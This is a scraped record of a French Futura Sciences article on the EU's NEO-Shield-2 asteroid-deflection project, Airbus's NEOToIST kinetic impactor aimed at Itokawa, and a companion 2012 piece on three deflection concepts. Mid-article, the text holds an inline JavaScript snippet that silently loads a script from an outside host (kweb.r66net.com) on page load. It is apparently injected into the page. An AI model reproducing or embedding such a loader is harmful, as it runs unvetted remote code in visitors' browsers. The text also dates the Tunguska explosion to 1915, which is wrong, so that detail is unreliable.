{"title": "NEO-Shield 2 : proteger la Terre des asteroides grace a un percuteur cinetique", "newspaper": "Futura Sciences", "author": ["Remy Decourt"], "date_publi": "2017-05-29", "content": "Dans le cadre du projet NEO-Shield-2, pour etudier les moyens de devier un asteroide dangereux pour la Terre, l'Union europeenne envisage une mission de demonstration sur un corps deja connu : Itokawa. Airbus propose un percuteur cinetique, baptise NEOToIST. Albert Falke, responsable du programme de deviation des asteroides, nous l'explique. La semaine derniere, des specialistes de l'espace se sont reunis a Tokyo a l'occasion de la cinquieme Conference sur la defense planetaire, organisee par l'Academie internationale d' astronautique  (IAA), pour reflechir a la menace que representent les  asteroides  et les  cometes  et au moyen de les devier. Les experts d'Airbus y ont expose les avancees du projet NEO-Shield-2 et presente un  << nouveau scenario de mission possible s'appuyant sur un percuteur cinetique, baptise NEOToIST >> , nous explique Albert Falke, responsable du programme de deviation des asteroides d'Airbus et en charge de la coordination de NEO-Shield-2 avec l'Union europeenne qui finance l'etude. Des trois scenarios precedemment envisages dans NEO-Shield-1 pour devier la trajectoire d'un asteroide, Airbus pense que le lancement d'un engin a tres grande  vitesse  pour le percuter de facon a le devier de sa trajectoire est  << la solution la plus simple et techniquement realisable dans des delais assez courts >> . Les deux autres solutions ne sont pas pour autant definitivement abandonnees. L'idee de tracter gravitationnellement un asteroide par une sonde volant en formation est jugee  << efficace sur le papier mais les technologies necessaires ne sont pas suffisamment matures pour la mettre en oeuvre >> . Quant a l'idee de faire exploser une charge nucleaire a proximite de l'objet en esperant que l'onde de choc modifie sa trajectoire, elle progresse chez les Americains. Cote europeen, elle est plus ou moins abandonnee. Diplomatiquement, il sera tres difficile a l' ESA  de faire accepter ce scenario a certains de ses Etats membres,  vent  debout contre l'utilisation de l' energie  nucleaire.  NEOToIST est une mission experimentale visant a demontrer  << la maturite de la technologie de deviation >>  et a repondre aux incertitudes relatives  << aux proprietes  physiques  de la deviation des asteroides ne pouvant etre etablies sur  Terre  >> . Elle associe  << un  impacteur  et un satellite de surveillance  in situ  dans un seul engin spatial >> . L'ancien projet d'etude baptise Don Quichotte, pour devier un asteroide. (c) ESA                       Vitesse et precision : une necessite pour devier un asteroide Bien que la technologie existe pour realiser cette mission,  << quelques points durs sont identifies >> . D'abord, l'impacteur doit arriver sur l'asteroide a  << l'endroit precis prevu et le percuter a une tres grande vitesse >> . Or, les systemes GNC (Guidage, Navigation et Controle) utilises aujourd'hui et qui assurent le  pilotage et le controle du vol  des satellites  << n'ont pas le bon degre de precision sur une mission de cette nature >> .  << Il est necessaire de developper des outils de navigation plus complexes pour la visee et la vitesse. >>  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quant au satellite qui suivra la scene, il se separera de l'impacteur cinetique juste avant l'impact de facon a  << observer et mesurer la modification de la rotation >> . Ces observations rapprochees fourniront des informations detaillees sur le point d'impact et le succes de la mission. On peut penser que, profitant de ce promontoire exceptionnel, des instruments scientifiques seront utilises pour renseigner sur la composition des ejectas et du sous-sol mis au jour. Mais, en raison de ses tres grandes vitesses de deplacement, a plus de 10 kilometres par seconde, et de rotation pour suivre la zone d'impact, ce satellite  << aura bien du mal a la photographier, la filmer et relayer ses donnees a destination de la Terre >> . Malgre ces points durs, Airbus et ses partenaires industriels ont la capacite technique pour realiser cette mission.  << La technologie existe. Il faut la maturer et l'ameliorer. >>  Seul le financement pose probleme en raison d'un contexte budgetaire difficile. C'est pourquoi, Airbus  << souhaite que cette mission soit soutenue par plusieurs agences spatiales >> . Airbus a deja identifie l'asteroide cible de cette mission de demonstration. Il s'agit d'Itokawa, un asteroide que la  sonde japonaise Hayabusa  a rejoint en 2005 pour s'y poser et prelever des echantillons de surface rapportes sur Terre en juin 2010. Le choix de cet asteroide n'est pas anodin. C'est un objet que les astronomes ont tres bien caracterise. Sa structure, sa surface et sa topographie sont connues. Surtout, sa forme de cacahuete est une aubaine pour Airbus. L'idee serait de  << l'impacter a une certaine distance de son axe de rotation, sur une des deux extremites, afin de modifier et accelerer sa  periode de rotation  >> . Cette acceleration sera infime mais suffisante pour lui faire modifier sa trajectoire. Si l'Union europeenne et l' Agence spatiale europeenne  decident de financer cette mission de demonstration,  << un lancement serait possible des 2022 >> . Les deux satellites de NEOToIST seraient lances par Vega, depuis le Centre spatial de Kourou. Pour rejoindre Itokawa et le percuter a la vitesse necessaire, Airbus prevoit  << d'adapter aux besoins de la mission l'etage superieur Avum de  Vega  de facon a l'utiliser comme etage de croisiere entre la Terre et Itokawa >> . Cet etage serait alors utilise dans une configuration similaire a celle du lancement du satellite  Lisa  Pathfinder. Pour en savoir plus Protection de la Terre contre les asteroides : comment faire ? Article de  Remy Decourt  publie le 9 fevrier 2012  L'Union europeenne veut proteger la Terre contre les impacts d'asteroides ou de cometes  geocroiseurs . Elle vient de donner son  feu  vert au financement de  NEO-Shield, une ambitieuse  etude pour determiner la meilleure technique. Interroge par Futura-Sciences, Erwan Kervendal, responsable a Toulouse de  NEO-Shield , nous explique les trois scenarios envisages. Tout savoir sur les  asteroides Les geocroiseurs ( Near Earth Objects ,  NEO ) sont des objets dont l' orbite  les amene a couper celle de la Terre. Cette proximite est un reel sujet de preoccupation et necessite que l'on protege la Planete bien mieux qu'on ne le fait aujourd'hui. Pour ne pas subir le sort des  dinosaures  ou revenir a l'age de pierre, scientifiques et industriels du programme NEO-Shield se sont reunis il y a quelques semaines pour discuter de la meilleure facon d'eviter l'impact d'un objet filant droit vers la Terre. Reunion qui a porte ses fruits. L'Union europeenne a decide de financer une etude portant sur la definition de trois concepts susceptibles de proteger la Terre contre les  impacts de geocroiseurs . Rassurez-vous, les possibilites qu'un objet s'ecrase contre la Terre sont tres faibles. Le dernier evenement significatif en date est celui de l' explosion en 1915 d'un asteroide  de plusieurs dizaines de metres au-dessus d'une region inhabitee de  Toungouska  (Siberie). Reste que s'il n'est pas possible de predire la  chute d'un asteroide  ou d'une comete sur la Terre, on estime qu'environ 1.000 objets sont potentiellement dangereux ( Potentially Hazardous Objects ). Il s'agit d'objets dont le diametre depasse les 140 metres et dont l'orbite coupe celle de la Terre. Asteroides ou cometes, peu importe leur nom, si un tel objet devait percuter la Terre, les dommages et les consequences seraient proportionnels a sa taille. Un asteroide d'un kilometre de diametre mettrait fin a l'espece humaine. (c) DR                               NEO-Shield, pour se proteger des geocroiseurs Ce futur bouclier NEO-Shield constituera la plus importante activite internationale menee dans ce domaine et mobilisera des institutions et entreprises issues de toute l'Europe, des Etats-Unis et de la Russie. Ces projets seront coordonnes par l'Institut de planetologie du  DLR  a Berlin. Astrium en sera le chef de file industriel et cordonnera les activites en vue de mettre au point une premiere mission de demonstration.  Pour comprendre ce programme, Futura-Sciences a rencontre Erwan Kervendal, responsable a Toulouse de NEO-Shield pour Astrium. Cet ingenieur de formation a travaille sur les programmes lunaire ( Lunar  lander ) et martien (retour d'echantillons) de l'Esa, notamment dans le domaine du guidage, navigation, controle (GNC). Depuis juin 2011, il est responsable de l'equipe etudes GNC. << Nous avons identifie trois concepts qui nous semblent etre les plus realistes >> , nous explique-t-il. Ces trois annees et demie vont permettre de definir a quoi pourrait ressembler le futur bouclier de la Terre contre les geocroiseurs et voir  << de quelle maniere on peut avancer sur ces concepts >> . A l'issue de ce travail, il sera peut-etre possible  << de statuer sur la non-pertinence d'un des trois scenarios >> . Quel que soit le concept retenu pour proteger la Terre d'un geocroiseur, une sonde sera envoyee en eclaireur pour mieux connaitre la cible a fragmenter ou a devier. (c) Astrium                               Des trois scenarios, le plus surprenant est celui qui consiste a faire devier un  asteroide  de sa trajectoire initiale par  << l'attraction ( gravite ) induite par une sonde volant en formation avec l'asteroide >> . Le deuxieme scenario, le plus prometteur, verrait le lancement d'un  << engin a tres grande vitesse pour percuter l'asteroide de facon a le devier de sa trajectoire et eviter une collision avec la Terre >> . Quant a la derniere methode envisagee, la plus delicate, elle prevoit egalement une deviation mais a l'aide d'une explosion proche de la surface de l'asteroide. L'idee est de faire exploser une charge nucleaire  << a proximite de l'objet en esperant que l'onde de choc modifie sa trajectoire de rencontre avec la Terre >> . Cette methode serait bien evidemment utilisee comme  << un dernier recours dans le cas ou l'objet n'aurait pas ete detecte suffisamment tot pour planifier une des deux methodes precedentes >> . La precision, maitre mot de ce futur bouclier Pour chaque scenario, **<< nous avons identifie plusieurs points durs >>  dont certains sont communs aux trois propositions, par exemple la precision concernant le guidage, la navigation et le controle jusqu'au rendez-vous avec le geocroiseur. Chaque scenario a ses avantages et ses inconvenients. Le remorquage gravitationnel necessite que l'on s'y prenne tres tot car  << plusieurs annees seront necessaires pour devier un asteroide de sa trajectoire >> . Ce concept sera etudie par l'Institut  Carl Sagan  de Palo Alto, en Californie, qui entreprendra egalement des travaux similaires au profit de la Nasa. Quant a l'impact cinetique, ses inconvenients concernent l'impulsion qui sera infime mais devra etre suffisante pour devier l'asteroide de trajectoire et la prevision du comportement des debris qui en resultera.  << D'ou des etudes a realiser sur la formation et la propagation des debris d'un objet  solide  >> , qui sera etudiee par Astrium. Le concept de deviation par effet de souffle, obtenu par l'utilisation d'une charge nucleaire, sera explore par l'institut de recherche russe TsNIImash, qui s'attardera egalement sur les effets non desirables qu'elle peut provoquer, en travaillant pour le compte de l'Agence spatiale russe Roscosmos. Le concept de l'impact cinetique sera certainement retenu pour une mission de demonstrateur. Cette mission necessite l'utilisation de technologies de guidage, de navigation et de controle que maitrise l'industrie spatiale europeenne et qu'Astrium met en oeuvre dans le programme ATV de l'Esa. (c) Astrium                               Pour chaque scenario de mission, un concept realiste va etre propose.  << De sa faisabilite aux technologies que l'on va utiliser a son financement et aux questions ethiques >> , de nombreux parametres vont etre passes en revue de facon a  << permettre de lever certaines options pour rendre ces scenarios realisables >> . Si les technologies actuelles rendent possible d'envisager des missions de deviation d'asteroides,  *<< une adaptation de ces technologies a ces missions sera forcement necessaire >> . Le challenge technique consistera donc a  << mettre au point des missions suffisamment robustes, d'une tres grande fiabilite et capables de fonctionner pendant toute la  duree  de leur mission, de la phase de croisiere et de navigation qui prendra plusieurs annees, au jour J qu'il ne faudra absolument pas rater >> . Il faut garder a l'esprit que cette protection de la Terre ne va pas se jouer a quelques encablures de nous mais a des distances tres eloignees.  << On parle de missions qui dureront plusieurs annees, voire deux decennies. >> Enfin, pour rendre ce bouclier efficace, il sera necessaire de connaitre de facon tres precise la composition et la trajectoire de chaque  asteroide potentiellement dangereux . Ce qui n'est absolument pas le cas aujourd'hui. C'est pourquoi on assiste regulierement a des alertes, toujours levees. C'est un  << reel sujet de preoccupation >>  et  << nous comptons aussi sur la mission  Gaia  >>  de l'Agence spatiale europeenne. Si cette mission, dont le lancement est prevu en 2013, a pour objectif principal d'etablir la carte la plus precise possible d'un milliard d' etoiles  de notre  galaxie , elle va egalement  << permettre d'avoir plus d'informations pour surveiller de  nombreuses familles d'asteroides  qui croisent pres de la Terre >> . Quant aux nombreux  reseaux de surveillance  du ciel, on s'attend, sur ces prochaines annees, a ce qu'ils montent en puissance pour etre en mesure de  << caracteriser aussi finement que possible l'orbite des geocroiseurs les plus menacants >> . Il ne faudrait pas lancer une mission a la rencontre d'un objet et s'apercevoir plusieurs annees apres son lancement qu'il ne represente plus une menace... Erwan Kervendal nous precise qu'a l'issue de ces trois annees et demie,  << nous proposerons a l'Esa et l'Union europeenne de financer un demonstrateur >>  qui sera tres vraisemblablement une mission d'impact au  << retour scientifique significatif >> . Il y a quelques annees, ce concept avait deja ete etudie par Astrium au profit de l'Agence spatiale europeenne pour la  mission Don Quichotte , abandonnee en 2006. ", "theme": "sciences"}